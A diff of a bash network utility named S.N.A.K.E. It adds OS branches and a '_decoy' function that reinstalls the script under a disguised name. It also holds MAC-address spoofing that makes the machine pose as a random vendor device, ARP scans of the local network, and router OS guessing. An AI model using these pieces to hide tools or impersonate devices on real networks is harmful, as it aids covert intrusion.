@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-_version="0.5.2"
+_version="0.5.3"
 _name="S.N.A.K.E"
 _morph_state="Unknown"
 
@@ -15,7 +15,7 @@ _undying=true
 
 
 _repo0="https://github.com/mldMoldovan/snake.git"
-_repo1="nry"
+_repo1="http://s000.tinyupload.com/?file_id=07848253478447736564"
 _repo2="nry"
 _repo3="nry"
 
@@ -91,6 +91,18 @@ _wts(){ #selfp
 }
 
 
+_decoy(){
+
+_converted=$( echo $1 | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+
+    cd ~ ; mkdir .blanao ; cd .blanao
+    sudo cp /usr/local/bin/snake ./snake
+    cat snake | sed "s/snake/$1/g" | sed "s/S.N.A.K.E/$_converted/g" >> $1
+    sudo chmod +x $1 ; sudo cp $1 /usr/local/bin/ ; cd .. ; sudo rm -rf .blanao
+
+}
+
+
 
 
 _mirror(){ #selft
@@ -124,7 +136,7 @@ _people(){ #selfe
        arp -a | awk '{print $1,$3,$2}'
     elif [[ $_system == "GNU" ]]; then
         arp -a | awk '{print $1,$3,$2}'
-    elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
+    elif [[ $_system == "$(uname -n)" ]]; then
        sudo arp-scan -l | sed '1,2d' | sed '$d' | sed '$d' | sed '$d' | sed '$d'
     else
        printf "$RED Not supported on your OS$NC\n"
@@ -250,7 +262,7 @@ elif [[ $_system == "OS/390" ]]; then
 
 else
 
-  printf "$RED Not supported default$NC\n"
+  printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -316,6 +328,10 @@ elif [[ $_system == "GNU" ]]; then
   sh snake -uninstall
   rm -rf snake
 
+elif [[ $_system == "HP-UX" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
 elif [[ $_system == "Haiku" ]]; then
 
 
@@ -354,7 +370,15 @@ elif [[ $_system == "SunOS" ]]; then
 
   printf "$RED Not supported yet$NC\n"
 
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
 elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
 
   printf "$RED Not supported yet$NC\n"
 
@@ -372,7 +396,7 @@ elif [[ $_system == "OS/390" ]]; then
 
 else
 
-  printf "$RED Not supported default$NC\n"
+  printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -393,15 +417,21 @@ _myself(){ #selfc
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "Haiku" ]]; then
       printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "HP-UX" ]]; then
+      printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "Minix" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "OpenBSD" ]]; then
       printf "$RED Not supported yet$NC\n"
-  elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
+  elif [[ $_system == "$(uname -n)" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "SunOS" ]]; then
       printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+      printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+      printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
       printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
       printf "$RED Not supported yet$NC\n"
@@ -410,8 +440,27 @@ _myself(){ #selfc
   elif [[ $_system == "OS/390" ]]; then
       printf "$RED Not supported yet$NC\n"
   else
-      printf "$RED Not supported default$NC\n"
+      printf "$RED Not supported sys$NC\n"
   fi
+
+}
+
+
+_stringify(){
+
+
+
+   if [ "$1" == "-n" ]; then
+      awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\\n//g'
+   elif [[ "$1" == "-v" ]]; then
+      awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\$//g'
+   elif [[ "$1" == "-nv" ]]; then
+      awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\$//g' | sed 's/\\n//g'
+   elif [[ "$1" == "-vn" ]]; then
+      awk '$1=$1' ORS='\\n' $2 | sed 's/ //g' | sed 's/\$//g' | sed 's/\\n//g'
+   else
+      awk '$1=$1' ORS='\\n' $1 | sed 's/ //g'
+   fi
 
 }
 
@@ -447,10 +496,10 @@ _self(){ #selfh
      elif [[ "$2" == "add" ]]; then
        sudo mkdir .blanao ; cd .blanao ; sudo cp /usr/local/bin/snake ./snake
        sudo chmod +w snake
-       sudo echo "$3(){" >> snake
-       sudo echo " " >> snake
-       sudo echo "}" >> snake
-       snake -qinstall
+       echo "$3(){" >> snake
+       echo " " >> snake
+       echo "}" >> snake
+       sudo chmod +x snake ; sudo cp snake /usr/local/bin
        cd .. ; sudo rm -rf .blanao
      elif [[ "$2" == "rmv" ]]; then
        sudo mkdir .blanao ; cd .blanao ; sudo cp /usr/local/bin/snake ./snake
@@ -469,7 +518,7 @@ _self(){ #selfh
      if [ "$2" == "num" ]; then
        cat /usr/local/bin/snake | grep  '_system == "' | grep -v 'INTEGRITY' | awk '{print $5}' | sort -u | sed 's/"$(uname/"Unix"/g' | sed 's/GNU/Hurd/g' | sed '$d' | sed '$d' | sed '$d' | sort -u | wc -l | sed 's/ //g'
      elif [[ "$2" == "list" ]]; then
-       cat /usr/local/bin/snake | grep  '_system == "' | grep -v 'INTEGRITY' | awk '{print $5}' | sort -u | sed 's/"$(uname/"Unix"/g' | sed 's/GNU/Hurd/g' | sed 's/CYGWIN_NT-10.0/Windows 10/g' | sed 's/CYGWIN_NT-6.1/Windows 7/g' | sed 's/CYGWIN_NT-5.1/Windows XP/g' | sed 's/OS\/390/z\/OS/g' | sed 's/"/ /g' | sed '$d' | sed '$d' | sed '$d' | sort -u
+       cat /usr/local/bin/snake | grep  '_system == "' | grep -v 'INTEGRITY' | awk '{print $5}' | sort -u | sed 's/"$(uname/"Unix"/g' | sed 's/GNU/Hurd/g' | sed 's/CYGWIN_NT-10.0/Windows 10/g' | sed 's/CYGWIN_NT-5.0/Windows 2000/g' | sed 's/CYGWIN_NT-6.0/Windows Vista/g' | sed 's/CYGWIN_NT-6.1/Windows 7/g' | sed 's/CYGWIN_NT-5.1/Windows XP/g' | sed 's/OS\/390/z\/OS/g' | sed 's/"/ /g' | sed '$d' | sed '$d' | sed '$d' | sort -u  | sed '1d'
      elif [[ "$2" == "ratio" ]]; then
           if [ "$3" == "i" ]; then
               printf "AIX $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"AIX"')\n"
@@ -483,17 +532,45 @@ _self(){ #selfh
               printf "SunOS $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"SunOS"')\n"
               printf "Unix $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"$(uname')\n"
               printf "Windows 10 $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-10.0"')\n"
+              printf "Windows 2000 $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-5.0"')\n"
               printf "Windows 7 $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-6.1"')\n"
+              printf "Windows Vista $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-6.0"')\n"
               printf "Windows XP $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-5.1"')\n"
               printf "z/OS $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"OS/390"')\n"
           elif [[ "$3" == "w" ]]; then
-              printf "Darwin $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"Darwin"')\n"
-              printf "Linux $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"Linux"')\n"
-              printf "OpenBSD $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"OpenBSD"')\n"
-              printf "Minix $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"Minix"')\n"
-              printf "Haiku $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"Haiku"')\n"
-              printf "GNU $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"GNU"')\n"
-              printf "Unix $(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"$(uname')\n"
+              printf "AIX $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' | sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'AIX"];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Darwin $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Darwin"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "HP-UX $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'HP-UX"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Haiku $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Haiku"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "GNU $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'GNU"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Linux $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Linux"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Minix $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Minix"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "OpenBSD $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'OpenBSD"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "SunOS $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'SunOS"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Unix $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | sed 's/)//g' | awk -F'uname-n"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Windows 10 $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-10.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Windows 2000 $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-5.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Windows 7 $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-6.1"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Windows Vista $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-6.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "Windows XP $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'NT-5.1"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+              printf "z/OS $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'OS/390"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')\n"
+          elif [[ "$3" == "m" ]]; then
+              printf "AIX $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"AIX"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'AIX"];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Darwin $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"Darwin"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Darwin"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "HP-UX $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"HP-UX"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'HP-UX"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Haiku $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"Haiku"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Haiku"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "GNU $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"GNU"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'GNU"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Linux $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"Linux"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Linux"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Minix $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"Minix"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'Minix"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "OpenBSD $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"OpenBSD"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'OpenBSD"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "SunOS $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"SunOS"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'SunOS"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Unix $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"$(uname') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/)//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'uname-n"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Windows 10 $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-10.0"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-10.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Windows 2000 $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-5.0"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-5.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Windows 7 $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-6.1"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-6.1"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Windows Vista $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-6.0"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-6.0"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "Windows XP $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"CYGWIN_NT-5.1"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'CYGWIN_NT-5.1"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
+              printf "z/OS $(echo "$(cat /usr/local/bin/snake | grep  '_system == "' | awk '{print $5}' | grep -c '"OS/390"') - $(awk '$1=$1' ORS='\\n' /usr/local/bin/snake | sed 's/ //g' | sed 's/\\n//g' |sed 's/\$//g' | sed 's/nn//g' | sed 's/tw//g' | sed 's/tn//g' | awk -F'OS/390"]];thenprintf"REDNotsupportedyet' 'NF{print NF-1}')" | bc -l)\n"
           else
               printf "$RED SYS ERROR$NC\n"
           fi
@@ -513,17 +590,9 @@ _self(){ #selfh
        sudo rm -rf snake
        cat snake2 | sed "s/_newj()/_jvdr()/g" | sed "s/_newv()/_vndr()/g" | sed "s/_newj/_jvdr/g" | sed "s/_newv/_vndr/g" > snake
        sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
-       printf "$YELLOW Standard database initiated.$NC\n"
+       printf "$GREEN Standard database initiated.$NC\n"
 
-       :'
-       sudo cp /usr/local/bin/snake ./snake
-       sudo cp snake snake2
-       sh snake -uninstall
-       sudo rm -rf snake
-       cat snake2 | sed "s/#db1/#db0/g" > snake
-       sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
-       printf "$RED Standard database initiated.$NC\n"
-       '
+
      elif [[ "$2" == "b" ]]; then
 
        sudo cp /usr/local/bin/snake ./snake
@@ -532,24 +601,16 @@ _self(){ #selfh
        sudo rm -rf snake
        cat snake2 | sed "s/_jvdr()/_uf()/g" | sed "s/_vndr()/_uf2()/g" | sed "s/_jvdr/_newj/g" | sed "s/_vndr/_newv/g" > snake
        sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
-       printf "$YELLOW Backup database initiated.$NC\n"
+       printf "$RED Backup database initiated.$NC\n"
 
-       :'
-       sudo cp /usr/local/bin/snake ./snake
-       sudo cp snake snake2
-       sh snake -uninstall
-       sudo rm -rf snake
-       cat snake2 | sed "s/#db0/#db1/g" > snake
-       sudo rm -rf snake2 ; sh snake -qinstall ; sudo rm -rf snake
-       printf "$RED Standard database initiated.$NC\n"
-       '
+
      elif [[ "$2" == "w" ]]; then
        _valoare="$(cat /usr/local/bin/snake | grep -c 'uf()')"
 
        if [ $_valoare == "2" ]; then
-          printf "Standard\n"
+          printf "$GREEN Standard$NC\n"
        else
-          printf "Backup\n"
+          printf "$RED Backup$NC\n"
        fi
      else
         printf "$RED DB ERROR$NC\n"
@@ -563,7 +624,7 @@ _self(){ #selfh
    elif [[ "$1" == "magic" ]]; then
      printf "$RED FUNC$YELLOW SYS$GREEN DB$NC\n"
    else
-     printf "$RED Not supported default $NC\n"
+     printf "$RED Not supported default$NC\n"
    fi
 
 
@@ -587,11 +648,15 @@ _everything(){ #selfc
        printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "OpenBSD" ]]; then
        printf "$RED Not supported yet$NC\n"
-   elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
+   elif [[ $_system == "$(uname -n)" ]]; then
        printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "SunOS" ]]; then
        printf "$RED Not supported yet$NC\n"
+   elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+       printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+       printf "$RED Not supported yet$NC\n"
+   elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
        printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
        printf "$RED Not supported yet$NC\n"
@@ -600,7 +665,7 @@ _everything(){ #selfc
    elif [[ $_system == "OS/390" ]]; then
        printf "$RED Not supported yet$NC\n"
    else
-       printf "$RED Not supported default$NC\n"
+       printf "$RED Not supported sys$NC\n"
    fi
 
 
@@ -611,7 +676,7 @@ _router_info(){ #selfc
 
   _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "Darwin" ]; then #tw
 
      printf "\n"
      printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2}')$NC\n"
@@ -621,6 +686,8 @@ _router_info(){ #selfc
      printf "\n"
      printf "$(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')\n"
      printf `_jvdr $(arp -a | grep $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | awk '{print $4}')`
+     printf "\n"
+     printf "$(snake _wit? $(ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12) | sed 's/Aggressive OS guesses/Running/g' | grep 'Running:' | sed -n '1p' | awk '{print $2,$3}')\n"
      printf "$NC$BLINK\n"
      printf "\n"
      curl ipinfo.io/city
@@ -628,7 +695,7 @@ _router_info(){ #selfc
      curl ipinfo.io/org
      printf "$NC\n"
 
-  elif [[ $_system == "Linux" ]]; then
+  elif [[ $_system == "Linux" ]]; then #nn
     printf "\n"
     printf "$WHITE$(nmcli -t -f active,ssid |grep enp0s3 | sed '$d' | awk '{print $4,$5,$6}')$NC\n"
     printf "\n"
@@ -651,15 +718,19 @@ _router_info(){ #selfc
      printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "OpenBSD" ]]; then
      printf "$RED Not supported yet$NC\n"
-  elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
-     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "SunOS" ]]; then
      printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+     printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
      printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
      printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+     printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "$(uname -n)" ]]; then
      printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "OS/390" ]]; then
      printf "$RED Not supported yet$NC\n"
@@ -693,7 +764,7 @@ _network(){ #selfe
        elif [[ $_system == "Linux" ]]; then
           printf "$RED Not supported yet$NC\n"
        else
-          printf "$RED Not supported default$NC\n"
+          printf "$RED Not supported sys$NC\n"
        fi
    elif [[ "$1" == "max" ]]; then
        if [ $_system == "Darwin" ]; then
@@ -706,10 +777,10 @@ _network(){ #selfe
           printf "$RED Not supported yet$NC\n"
        elif [[ $_system == "Haiku" ]]; then
           printf "$RED Not supported yet$NC\n"
-       elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
+       elif [[ $_system == "$(uname -n)" ]]; then
           printf "$RED Not supported yet$NC\n"
        else
-          printf "$RED Not supported default$NC\n"
+          printf "$RED Not supported sys$NC\n"
        fi
    elif [[ "$1" == "router" ]]; then
        _router_info
@@ -822,33 +893,85 @@ _logo(){ #selfp
        _l_unblink
      fi
 
-  elif [[ $_system == "OpenBSD" ]]; then
+   elif [[ $_system == "GNU" ]]; then
 
-     if $_blinking ; then
-       _l_blink
-     else
-       _l_unblink
-     fi
+         _l_poor
+
+  elif [[ $_system == "Haiku" ]]; then
+
+         _l_poor
+
+  elif [[ $_system == "HP-UX" ]]; then
+
+         _l_poor
 
   elif [[ $_system == "Minix" ]]; then
 
       _l_poor
 
-  elif [[ $_system == "Haiku" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then
 
-      _l_poor
+       if $_blinking ; then
+         _l_blink
+       else
+         _l_unblink
+       fi
 
-  elif [[ $_system == "GNU" ]]; then
 
-        _l_poor
+  elif [[ $_system == "SunOS" ]]; then
 
-  elif [[ $_system == "$(uname -n)" ]]; then # UNIX
+       _l_poor
+
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+          _l_poor
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+             if $_blinking ; then
+               _l_blink
+             else
+               _l_unblink
+             fi
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+             if $_blinking ; then
+               _l_blink
+             else
+               _l_unblink
+             fi
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+             if $_blinking ; then
+               _l_blink
+             else
+               _l_unblink
+             fi
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+          if $_blinking ; then
+            _l_blink
+          else
+            _l_unblink
+          fi
+
+
+  elif [[ $_system == "OS/390" ]]; then
+
+       _l_poor
+
+
+
+  elif [[ $_system == "$(uname -n)" ]]; then
 
       _l_poor
 
   else
 
-    printf "$REDmOO$WHITEmOO$NC\n"
+    printf "$RED mOO$WHITE mOO$NC\n"
 
   fi
 
@@ -868,7 +991,11 @@ _samsung(){ #morph
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "AIX" ]; then
+
+  printf "$RED Not supported yet$NC\n"
+
+elif [[ $_system == "Darwin" ]]; then #tw
 
 _off
 sudo ifconfig en0 ether $(hexchars="0123456789ABCDEF"
@@ -882,7 +1009,7 @@ else
 printf "$WHITE Samsung :: $(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 fi
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
 sudo ip link set dev enp0s3 down
 sudo ip link set dev enp0s3 address $(echo ${_codes[$_rnd]}:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10]:$[RANDOM%10]$[RANDOM%10])
@@ -897,28 +1024,57 @@ fi
 
 elif [[ $_system == "GNU" ]]; then
 
-  printf "Not supported yet\n"
